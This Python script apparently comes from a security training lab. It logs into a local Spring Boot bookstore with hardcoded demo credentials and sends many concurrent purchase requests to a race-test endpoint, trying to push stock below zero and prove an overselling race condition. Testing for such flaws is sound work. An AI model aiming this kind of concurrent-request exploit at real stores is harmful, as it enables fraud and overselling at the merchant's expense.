#!/usr/bin/env python3
"""
Race Condition Test - Using Real Purchase Flow (Python Version)
Converts the PowerShell race-test-fixed.ps1 to Python with threading
"""

import requests
import threading
import time
import argparse
import json
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

class RaceConditionTester:
    def __init__(self, base_url="http://localhost:8080", book_id="1", 
                 email="alice@secchamp.com", password="password123"):
        self.base_url = base_url
        self.book_id = book_id
        self.email = email
        self.password = password
        self.token = None
        self.session = requests.Session()
        
    def login(self):
        """Authenticate and get JWT token"""
        login_url = f"{self.base_url}/api/auth/login"
        login_data = {
            "email": self.email,
            "password": self.password
        }
        
        try:
            response = self.session.post(login_url, json=login_data, timeout=10)
            response.raise_for_status()
            
            login_response = response.json()
            self.token = login_response.get("token")
            
            if not self.token:
                raise Exception("No token received from login response")
                
            print("✅ Login OK, token received")
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Login failed: {e}")
            return False
    
    def make_race_test_request(self, thread_id, purchase_num):
        """Make a single race test request"""
        race_test_url = f"{self.base_url}/api/purchase/race-test/{self.book_id}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        
        try:
            response = self.session.post(race_test_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "success": data.get("success", False),
                    "stock": data.get("currentStock", 0),
                    "thread_id": thread_id,
                    "purchase_num": purchase_num,
                    "message": data.get("message", ""),
                    "title": data.get("title", "N/A"),
                    "status_code": response.status_code
                }
            else:
                error_data = {}
                try:
                    error_data = response.json()
                except:
                    pass
                    
                return {
                    "success": False,
                    "error": f"HTTP {response.status_code}",
                    "thread_id": thread_id,
                    "purchase_num": purchase_num,
                    "details": error_data.get("message", response.text[:200]),
                    "status_code": response.status_code
                }
                
        except requests.exceptions.RequestException as e:
            return {
                "success": False,
                "error": str(e),
                "thread_id": thread_id,
                "purchase_num": purchase_num,
                "details": "Request exception occurred",
                "status_code": "N/A"
            }
    
    def thread_worker(self, thread_id, purchases_per_thread):
        """Worker function for each thread"""
        results = []
        
        for i in range(1, purchases_per_thread + 1):
            result = self.make_race_test_request(thread_id, i)
            results.append(result)
            
            # Minimal delay to avoid overwhelming server
            time.sleep(0.01)  # 10ms delay
            
        return results
    
    def run_race_test(self, num_threads=15, purchases_per_thread=3):
        """Run the concurrent race condition test"""
        print(f"\n🚀 Race Condition Test - {num_threads} threads x {purchases_per_thread} purchases each")
        print("📍 Using DIRECT race test endpoint for maximum race condition potential")
        
        # Login first
        if not self.login():
            return False
        
        print(f"\n⚡ Starting {num_threads} concurrent threads, each making {purchases_per_thread} purchases...")
        
        all_results = []
        
        # Use ThreadPoolExecutor for better thread management
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # Submit all thread tasks
            future_to_thread = {
                executor.submit(self.thread_worker, thread_id, purchases_per_thread): thread_id
                for thread_id in range(1, num_threads + 1)
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_thread):
                thread_id = future_to_thread[future]
                try:
                    thread_results = future.result()
                    all_results.extend(thread_results)
                except Exception as e:
                    print(f"❌ Thread {thread_id} failed: {e}")
        
        # Analyze results
        self.analyze_results(all_results, num_threads, purchases_per_thread)
        return True
    
    def analyze_results(self, results, num_threads, purchases_per_thread):
        """Analyze and display test results"""
        successful = len([r for r in results if r.get("success")])
        failed = len([r for r in results if not r.get("success")])
        
        # Get stock levels from successful requests
        stock_levels = sorted(set([r["stock"] for r in results if r.get("success") and "stock" in r]))
        
        print(f"\n📊 Results:")
        print(f"Total Purchases Attempted: {num_threads * purchases_per_thread}")
        print(f"✅ Successful: {successful}")
        print(f"❌ Failed: {failed}")
        
        # Show error analysis if there are failures
        if failed > 0:
            print(f"\n🔍 Error Analysis:")
            failed_results = [r for r in results if not r.get("success")]
            
            # Group errors by type
            error_groups = defaultdict(int)
            for result in failed_results:
                error = result.get("error", "Unknown error")
                error_groups[error] += 1
            
            for error, count in error_groups.items():
                print(f"  {count}x: {error}")
            
            # Show first 3 detailed errors
            print(f"\n📋 First 3 detailed errors:")
            for i, result in enumerate(failed_results[:3]):
                thread_id = result.get("thread_id", "N/A")
                purchase_num = result.get("purchase_num", "N/A")
                error = result.get("error", "Unknown")
                details = result.get("details", "")
                
                print(f"  Thread {thread_id} Purchase {purchase_num}: {error}")
                if details:
                    print(f"    Details: {details}")
        
        # Stock level analysis
        if stock_levels:
            print(f"\n📈 Stock levels seen: {', '.join(map(str, stock_levels))}")
            min_stock = min(stock_levels)
            max_stock = max(stock_levels)
            print(f"📊 Stock range: {max_stock} → {min_stock}")
            
            if min_stock < 0:
                print(f"\n🚨 RACE CONDITION SUCCESS! Negative stock achieved: {min_stock}")
                print("🎯 This proves the vulnerability allows overselling!")
            else:
                print(f"\n✅ Stock stayed non-negative: {min_stock}")
                print("💡 Try increasing threads or purchases with: python race_test_fixed.py --threads 20 --purchases 5")
        else:
            print(f"\n⚠️  No stock levels recorded due to all failures")
            print(f"🔧 Check server status and book ID {self.book_id} exists with stock > 0")

def main():
    """Main function with command line argument parsing"""
    parser = argparse.ArgumentParser(description="Race Condition Test for Spring Boot Application")
    parser.add_argument("--threads", "-t", type=int, default=15, 
                       help="Number of concurrent threads (default: 15)")
    parser.add_argument("--purchases", "-p", type=int, default=3,
                       help="Number of purchases per thread (default: 3)")
    parser.add_argument("--url", "-u", type=str, default="http://localhost:8080",
                       help="Base URL of the application (default: http://localhost:8080)")
    parser.add_argument("--book-id", "-b", type=str, default="1",
                       help="Book ID to test with (default: 1)")
    parser.add_argument("--email", "-e", type=str, default="alice@secchamp.com",
                       help="Login email (default: alice@secchamp.com)")
    parser.add_argument("--password", "-w", type=str, default="password123",
                       help="Login password (default: password123)")
    
    args = parser.parse_args()
    
    print("🧪 Race Condition Tester - Python Version")
    print("=" * 50)
    
    # Create tester instance
    tester = RaceConditionTester(
        base_url=args.url,
        book_id=args.book_id,
        email=args.email,
        password=args.password
    )
    
    # Run the test
    try:
        success = tester.run_race_test(args.threads, args.purchases)
        if not success:
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⚠️  Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
